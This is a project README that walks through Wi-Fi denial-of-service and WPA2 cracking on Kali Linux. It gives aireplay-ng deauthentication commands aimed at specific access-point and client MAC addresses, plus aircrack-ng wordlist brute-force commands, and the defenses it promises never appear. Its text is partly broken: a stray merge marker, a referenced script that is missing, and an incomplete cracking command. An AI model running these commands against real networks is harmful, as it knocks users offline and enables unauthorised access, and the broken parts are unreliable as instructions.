# WiFi-DOS-Kali

Demo of Wi-Fi DoS attacks via Kali Linux using tools like Aircrack-ng and Aireplay-ng.  
This project demonstrates deauthentication attacks, brute-force cracking, and defenses.  
It also includes a presentation on attack types, tools, and commands.  

**⚠️ For ethical research and educational purposes only.**

---

## Table of Contents

1. [Demonstration](#demonstration)
2. [Instructions](#instructions)
3. [Prerequisites](#prerequisites)

---

## Demonstration

### View Network Interfaces
```bash
ifconfig
```

### Start Monitor Mode on `wlan0`
```bash
airmon-ng start wlan0
```

### Kill Interfering Processes
```bash
airmon-ng check kill
```

### Confirm Monitor Mode
```bash
iwconfig
```

### Start Scanning for Wi-Fi Networks
```bash
airodump-ng -i wlan0mon
```

### Target Specific BSSID and Channel
```bash
airodump-ng --bssid 8E:F5:A3:77:D6:DB -c 3 -- wlan0
airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan0mon
```

### Deauthentication Attack (Kick Clients Out)
```bash
aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan0mon
```

### Brute Force Attack
```bash
aircrack-ng -a2 -b 78:1D:BA:93:1F:9A -w /root/Desktop/rockyou.txt
aircrack-ng -a2 -b A8:32:9A:00:66:E8 -w /media/root/CAF04BE4F04BD57B/test/word.txt /media/root/CAF04BE4F04BD57B/test/Digicom-01.cap
```

### Stop Monitor Mode
```bash
airmon-ng stop wlan0mon
service network-manager restart
```

---

=======

**#  📝 Instructions** # WiFi-DOS-Kali

1. Save the script as `wifi_dos_attack.py`.
2. Run it with `sudo`:
   ```bash
   sudo python3 wifi_dos_attack.py
   ```
3. Ensure the Aircrack-ng suite is installed:
   ```bash
   sudo apt install aircrack-ng
   ```

---

## Prerequisites

- **Operating System**: Kali Linux
- **Tools**: Aircrack-ng suite (includes `airodump-ng`, `aireplay-ng`, etc.)
- **Hardware**: A Wi-Fi adapter capable of monitor mode and packet injection
- **Permissions**: Root access (`sudo`)

---

**Disclaimer**:  
This project is intended for ethical research and educational purposes only.  
Unauthorized use of these tools may violate laws and regulations.